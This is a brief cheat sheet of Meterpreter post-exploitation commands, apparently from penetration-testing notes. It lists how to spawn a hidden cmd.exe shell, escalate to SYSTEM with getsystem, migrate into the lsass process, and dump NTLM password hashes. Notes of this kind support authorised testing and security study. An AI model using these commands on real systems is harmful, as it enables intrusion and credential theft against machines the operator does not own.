# Basic Usage

### Common Commands

```bash
# meterpreter
meterpreter> help 

ls, cat, download, upload, search, getuid 

# Check your current user context 
meterpreter> getuid 

# Get a normal CMD prompt (shell) 
meterpreter > shell
meterpreter > execute -f cmd.exe -H -i

# Check your current privilege
meterpreter> getprivs

# Escalate to NT SYSTEM privilege
meterpreter > getsystem

# Migrate to specific process to escalaete
meterpreter> pgrep lsass
628 
meterpreter> migrate 628 

# Get NTLM hashes 
meterpreter > hashdump

# Move the meterpreter session background. 
meterpreter> background 
```
